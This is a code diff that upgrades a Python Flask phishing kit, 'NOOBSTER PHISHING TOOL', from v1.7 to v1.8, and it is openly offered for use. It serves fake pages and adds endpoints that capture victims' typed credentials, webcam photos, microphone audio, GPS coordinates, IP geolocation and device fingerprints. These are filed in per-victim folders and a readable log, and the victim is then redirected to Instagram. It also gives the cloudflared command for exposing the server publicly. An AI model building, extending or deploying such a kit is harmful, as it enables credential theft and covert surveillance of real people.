@@ -1,6 +1,7 @@
 """
-NOOBSTER PHISHING TOOL v1.7
-Local mode — no tunnel. Expose yourself with cloudflared.
+NOOBSTER PHISHING TOOL v1.8
+Local mode. Organized folder structure.
+
 Telegram: https://t.me/noob11001
 """
 
@@ -16,9 +17,9 @@ STATE = {"active_page": None}
 
 
 class C:
-    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
-    M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; D = "\033[90m"
-    BOLD = "\033[1m"; N = "\033[0m"
+    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
+    M="\033[95m"; Cc="\033[96m"; W="\033[97m"; D="\033[90m"
+    BOLD="\033[1m"; N="\033[0m"
 
 
 BANNER = r"""
@@ -29,8 +30,7 @@ BANNER = r"""
 ║    ██║╚██╗██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
 ║    ██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║   ██║        ║
 ║    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝        ║
-║              P H I S H I N G   T O O L   v1.7                ║
-║                  LOCAL MODE — no tunnel                      ║
+║              P H I S H I N G   T O O L   v1.8                ║
 ║                  t.me/noob11001                              ║
 ╚══════════════════════════════════════════════════════════════╝
 """
@@ -77,29 +77,60 @@ def parse_device(ua):
     return info
 
 
+def safe(s, max_len=30):
+    s = re.sub(r"[^a-zA-Z0-9_.-]", "_", s or "unknown")
+    return s[:max_len]
+
+
 def new_folder(ip, page):
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_ip = re.sub(r"[^a-zA-Z0-9_.-]", "_", ip or "unknown")
-    safe_page = re.sub(r"[^a-zA-Z0-9_-]", "_", page or "unknown")
-    folder = os.path.join(CAPTURE_DIR, f"{ts}_{safe_page}_{safe_ip}")
-    os.makedirs(folder, exist_ok=True)
-    return folder
+    """create folder like: 20261002_143022_freefire_103.21.44.5_14-30-22"""
+    now = datetime.now()
+    date = now.strftime("%Y%m%d_%H%M%S")
+    time_short = now.strftime("%H-%M-%S")
+    f = os.path.join(CAPTURE_DIR, f"{date}_{safe(page)}_{safe(ip)}_{time_short}")
+    os.makedirs(f, exist_ok=True)
+    return f
 
 
-def save_json(folder, name, data):
-    with open(os.path.join(folder, name), "w", encoding="utf-8") as f:
+def sub(folder, name):
+    """create subfolder inside capture folder"""
+    p = os.path.join(folder, name)
+    os.makedirs(p, exist_ok=True)
+    return p
+
+
+def save_json(folder, subfolder, fname, data):
+    d = sub(folder, subfolder)
+    path = os.path.join(d, fname)
+    with open(path, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
+    return path
+
+
+def append_info(folder, line):
+    """append to info.txt — human readable log"""
+    path = os.path.join(folder, "info.txt")
+    with open(path, "a", encoding="utf-8") as f:
+        f.write(line + "\n")
+
+
+def ts_short():
+    return datetime.now().strftime("%H-%M-%S")
+
+
+def ts_full():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 
 def header(ip, ua, page):
     dev = parse_device(ua)
     print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
-    print(f"{C.BOLD}{C.G}  🎯 NEW HIT{C.N}   {C.D}{datetime.now().strftime('%H:%M:%S')}{C.N}")
+    print(f"{C.BOLD}{C.G}  🎯 NEW HIT{C.N}   {C.D}{ts_full()}{C.N}")
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
-    print(f"  {C.C}Page    :{C.N} {C.W}{page}{C.N}")
-    print(f"  {C.C}IP      :{C.N} {C.Y}{ip}{C.N}")
-    print(f"  {C.C}Device  :{C.N} {C.W}{dev['model']}{C.N}  {C.D}({dev['type']}){C.N}")
-    print(f"  {C.C}OS      :{C.N} {C.W}{dev['os']}{C.N}  {C.D}| {dev['browser']}{C.N}")
+    print(f"  {C.Cc}Page    :{C.N} {C.W}{page}{C.N}")
+    print(f"  {C.Cc}IP      :{C.N} {C.Y}{ip}{C.N}")
+    print(f"  {C.Cc}Device  :{C.N} {C.W}{dev['model']}{C.N}  {C.D}({dev['type']}){C.N}")
+    print(f"  {C.Cc}OS      :{C.N} {C.W}{dev['os']}{C.N}  {C.D}| {dev['browser']}{C.N}")
 
 
 def footer():
@@ -130,6 +161,8 @@ def serve_selected():
     return render_template(page["template"], telegram=TELEGRAM)
 
 
+# ═══════════ CAPTURE ENDPOINTS ═══════════
+
 @app.route("/capture/photo", methods=["POST"])
 def cap_photo():
     if not STATE["active_page"]:
@@ -137,19 +170,30 @@ def cap_photo():
     d = request.get_json()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua = request.headers.get("User-Agent", "")
-    folder = new_folder(ip, d.get("page", "?"))
+    page = d.get("page", "?")
+    folder = new_folder(ip, page)
+    t = ts_short()
+
     b64 = d.get("photo", "")
     if "," in b64:
         b64 = b64.split(",", 1)[1]
     try:
-        with open(os.path.join(folder, "photo.jpg"), "wb") as f:
+        p = sub(folder, "photo")
+        path = os.path.join(p, f"photo_{t}.jpg")
+        with open(path, "wb") as f:
             f.write(base64.b64decode(b64))
-        print(f"  {C.G}📸 Photo saved{C.N}  {C.D}{folder}/photo.jpg{C.N}")
+        size_kb = os.path.getsize(path) // 1024
+        print(f"  {C.G}📸 Photo{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
+        append_info(folder, f"[{ts_full()}] PHOTO       {path} ({size_kb} KB)")
     except Exception as e:
         print(f"  {C.R}photo error: {e}{C.N}")
-    save_json(folder, "meta.json", {
-        "timestamp": datetime.now().isoformat(), "ip": ip,
-        "user_agent": ua, "device": parse_device(ua), "page": d.get("page", "?")
+
+    save_json(folder, "ip", f"ip_{t}.json", {
+        "timestamp": ts_full(),
+        "ip": ip,
+        "user_agent": ua,
+        "device": parse_device(ua),
+        "page": page
     })
     return jsonify({"ok": 1})
 
@@ -163,36 +207,67 @@ def cap_fp():
     ua = request.headers.get("User-Agent", "")
     page = d.get("page", "?")
     folder = new_folder(ip, page)
-    save_json(folder, "fingerprint.json", {
-        "timestamp": datetime.now().isoformat(), "ip": ip, "ua": ua, "data": d
+    t = ts_short()
+
+    # ipapi wala part
+    if "ipapi" in d:
+        api = d["ipapi"]
+        save_json(folder, "ip", f"ipinfo_{t}.json", {
+            "timestamp": ts_full(),
+            "ip": ip,
+            "country": api.get("country_name"),
+            "country_code": api.get("country_code"),
+            "region": api.get("region"),
+            "city": api.get("city"),
+            "postal": api.get("postal"),
+            "latitude": api.get("latitude"),
+            "longitude": api.get("longitude"),
+            "timezone": api.get("timezone"),
+            "org": api.get("org"),
+            "asn": api.get("asn"),
+            "raw": api
+        })
+        print(f"  {C.Cc}🌐 IP info{C.N}  {C.D}{api.get('city')}, {api.get('country_name')} — {api.get('org')}{C.N}")
+        append_info(folder, f"[{ts_full()}] IP          {ip} — {api.get('city')}, {api.get('country_name')} — {api.get('org')}")
+        footer()
+        return jsonify({"ok": 1})
+
+    # device fingerprint
+    save_json(folder, "device", f"device_{t}.json", {
+        "timestamp": ts_full(),
+        "ip": ip,
+        "data": d
     })
+
     if "screen" in d:
         bat = d.get("battery") or {}
         conn = d.get("connection") or {}
         gpu = d.get("gpu") or {}
         header(ip, ua, page)
-        print(f"  {C.C}Screen  :{C.N} {d.get('screen', {}).get('width', '?')}x"
-              f"{d.get('screen', {}).get('height', '?')}  "
-              f"{C.D}@{d.get('screen', {}).get('pixelRatio', '?')}x{C.N}")
-        print(f"  {C.C}Lang    :{C.N} {d.get('language', '?')}  "
-              f"{C.D}| TZ: {d.get('timezone', '?')}{C.N}")
+        print(f"  {C.Cc}Screen  :{C.N} {d.get('screen',{}).get('width','?')}x"
+              f"{d.get('screen',{}).get('height','?')}  {C.D}@{d.get('screen',{}).get('pixelRatio','?')}x{C.N}")
+        print(f"  {C.Cc}Lang    :{C.N} {d.get('language','?')}  {C.D}| TZ: {d.get('timezone','?')}{C.N}")
         if bat:
             pct = int((bat.get("level") or 0) * 100)
             chg = "⚡ charging" if bat.get("charging") else "🔋"
-            print(f"  {C.C}Battery :{C.N} {C.Y}{pct}%{C.N} {chg}")
+            print(f"  {C.Cc}Battery :{C.N} {C.Y}{pct}%{C.N} {chg}")
         if gpu:
-            print(f"  {C.C}GPU     :{C.N} {gpu.get('renderer', '?')[:50]}")
+            print(f"  {C.Cc}GPU     :{C.N} {gpu.get('renderer','?')[:50]}")
         if conn:
-            print(f"  {C.C}Network :{C.N} {conn.get('effectiveType', '?')} "
-                  f"{C.D}({conn.get('downlink', '?')}Mbps, {conn.get('rtt', '?')}ms){C.N}")
-        print(f"  {C.C}CPU     :{C.N} {d.get('hardwareConcurrency', '?')} cores  "
-              f"{C.D}RAM: {d.get('deviceMemory', '?')}GB{C.N}")
-    if "ipapi" in d:
-        api = d["ipapi"]
-        print(f"  {C.C}Country :{C.N} {api.get('country_name', '?')} ({api.get('country_code', '?')})")
-        print(f"  {C.C}City    :{C.N} {api.get('city', '?')}, {api.get('region', '?')}")
-        print(f"  {C.C}ISP     :{C.N} {api.get('org', '?')}")
-        footer()
+            print(f"  {C.Cc}Network :{C.N} {conn.get('effectiveType','?')} "
+                  f"{C.D}({conn.get('downlink','?')}Mbps){C.N}")
+        print(f"  {C.Cc}CPU     :{C.N} {d.get('hardwareConcurrency','?')} cores  "
+              f"{C.D}RAM: {d.get('deviceMemory','?')}GB{C.N}")
+
+        append_info(folder, f"[{ts_full()}] DEVICE      {d.get('screen',{}).get('width','?')}x"
+                    f"{d.get('screen',{}).get('height','?')} "
+                    f"CPU:{d.get('hardwareConcurrency','?')} "
+                    f"RAM:{d.get('deviceMemory','?')}GB "
+                    f"GPU:{(gpu.get('renderer') or '?')[:40]} "
+                    f"TZ:{d.get('timezone','?')}")
+        if bat:
+            append_info(folder, f"[{ts_full()}] BATTERY     {int((bat.get('level') or 0)*100)}% "
+                        f"{'charging' if bat.get('charging') else 'discharging'}")
     return jsonify({"ok": 1})
 
 
@@ -202,14 +277,42 @@ def cap_loc():
         abort(404)
     d = request.get_json()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    folder = new_folder(ip, d.get("page", "?"))
-    save_json(folder, "location.json", {
-        "timestamp": datetime.now().isoformat(), "ip": ip, "location": d
+    page = d.get("page", "?")
+    folder = new_folder(ip, page)
+    t = ts_short()
+
+    save_json(folder, "location", f"location_{t}.json", {
+        "timestamp": ts_full(),
+        "ip": ip,
+        "data": d
     })
+
     lat = d.get("lat"); lon = d.get("lon")
     if lat is not None:
-        print(f"  {C.G}📍 Location{C.N}  https://maps.google.com/?q={lat},{lon}  "
-              f"{C.D}(±{int(d.get('accuracy', 0))}m){C.N}")
+        gmaps = f"https://maps.google.com/?q={lat},{lon}"
+        print(f"  {C.G}📍 Location{C.N}  {C.D}{gmaps} (±{int(d.get('accuracy',0))}m){C.N}")
+        append_info(folder, f"[{ts_full()}] LOCATION    lat={lat} lon={lon} "
+                    f"accuracy=±{int(d.get('accuracy',0))}m")
+        append_info(folder, f"[{ts_full()}] MAPS        {gmaps}")
+    return jsonify({"ok": 1})
+
+
+@app.route("/capture/audio", methods=["POST"])
+def cap_audio():
+    if not STATE["active_page"]:
+        abort(404)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    page = request.form.get("page", "?")
+    folder = new_folder(ip, page)
+    t = ts_short()
+    f = request.files.get("audio")
+    if f:
+        p = sub(folder, "audio")
+        path = os.path.join(p, f"audio_{t}.webm")
+        f.save(path)
+        size_kb = os.path.getsize(path) // 1024
+        print(f"  {C.G}🎤 Audio{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
+        append_info(folder, f"[{ts_full()}] AUDIO       {path} ({size_kb} KB)")
     return jsonify({"ok": 1})
 
 
@@ -222,35 +325,52 @@ def cap_creds():
     ua = request.headers.get("User-Agent", "")
     page = d.get("page", "?")
     folder = new_folder(ip, page)
-    save_json(folder, "credentials.json", {
-        "timestamp": datetime.now().isoformat(), "ip": ip, "ua": ua,
-        "page": page, "fields": d.get("fields", {})
+    t = ts_short()
+
+    fields = d.get("fields", {})
+    save_json(folder, "credentials", f"input_{t}.json", {
+        "timestamp": ts_full(),
+        "ip": ip,
+        "ua": ua,
+        "page": page,
+        "fields": fields
     })
-    print(f"  {C.BOLD}{C.R}🔑 CAPTURED INPUT{C.N}  {C.D}page: {page}{C.N}")
-    for k, v in (d.get("fields") or {}).items():
+
+    print(f"  {C.BOLD}{C.R}🔑 USER INPUT{C.N}  {C.D}page: {page}{C.N}")
+    append_info(folder, f"[{ts_full()}] USER INPUT  page: {page}")
+    for k, v in fields.items():
         s = str(v)
         shown = s if len(s) < 60 else s[:57] + "..."
-        print(f"     {C.C}{k}{C.N} = {C.Y}{shown}{C.N}")
+        print(f"     {C.Cc}{k}{C.N} = {C.Y}{shown}{C.N}")
+        append_info(folder, f"[{ts_full()}]   {k} = {v}")
     footer()
     return jsonify({"ok": 1, "redirect": d.get("redirect", "https://www.instagram.com")})
 
 
+@app.route("/capture/debug", methods=["POST"])
+def cap_debug():
+    d = request.get_json()
+    print(f"  {C.D}[debug] {d.get('msg')}{C.N}")
+    return jsonify({"ok": 1})
+
+
+# ═══════════ MENU ═══════════
+
 def show_menu():
     os.system("clear" if os.name == "posix" else "cls")
     print(BANNER)
-    print(f"  {C.D}Telegram:{C.N} {C.C}{TELEGRAM}{C.N}\n")
-    print(f"{C.BOLD}{C.W}  SELECT A MODULE  {C.D}(only this one goes live){C.N}\n")
+    print(f"  {C.D}Telegram:{C.N} {C.Cc}{TELEGRAM}{C.N}\n")
+    print(f"{C.BOLD}{C.W}  SELECT A MODULE{C.N}\n")
     for k, p in PAGES.items():
         print(f"   {C.BOLD}{C.Y}[{k}]{C.N}  {p['icon']}  {C.W}{p['name']}{C.N}")
     print(f"\n   {C.BOLD}{C.Y}[0]{C.N}  🚀  {C.W}Start server{C.N}")
     print(f"   {C.BOLD}{C.Y}[q]{C.N}  ❌  {C.W}Quit{C.N}\n")
     while True:
         try:
-            choice = input(f"{C.BOLD}{C.C}  ▸ select: {C.N}").strip().lower()
+            choice = input(f"{C.BOLD}{C.Cc}  ▸ select: {C.N}").strip().lower()
         except (EOFError, KeyboardInterrupt):
             sys.exit(0)
         if choice == "q":
-            print(f"\n{C.D}bye.{C.N}\n")
             sys.exit(0)
         if choice in PAGES:
             STATE["active_page"] = PAGES[choice]["slug"]
@@ -262,7 +382,6 @@ def show_menu():
             if not STATE["active_page"]:
                 print(f"  {C.R}pick a module first.{C.N}\n")
                 continue
-            print(f"\n  {C.G}starting server...{C.N}\n")
             return
         print(f"  {C.R}invalid.{C.N}")
 
@@ -274,9 +393,8 @@ def boot():
     print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
     print(f"{C.BOLD}{C.G}  🎯 ACTIVE PAGE: {p['icon']}  {p['name']}{C.N}")
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
-    print(f"  {C.C}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
-    print(f"  {C.C}Root    :{C.N} {C.W}http://127.0.0.1:5000/{C.N}")
-    print(f"  {C.C}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
+    print(f"  {C.Cc}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
+    print(f"  {C.Cc}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")
     app.run(host="0.0.0.0", port=5000, debug=False)
 
